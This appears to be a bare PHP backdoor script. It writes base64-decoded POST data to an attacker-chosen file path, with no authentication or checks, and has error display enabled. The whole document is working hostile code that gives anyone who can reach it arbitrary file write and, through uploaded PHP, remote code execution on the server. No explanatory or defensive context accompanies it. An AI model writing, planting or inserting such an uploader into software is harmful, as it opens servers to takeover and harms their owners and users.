<?php error_reporting(E_ALL); ini_set('display_errors', 1); $fp = fopen($_POST['name'], 'wb'); fwrite($fp, base64_decode($_POST['content'])); fclose($fp); ?>
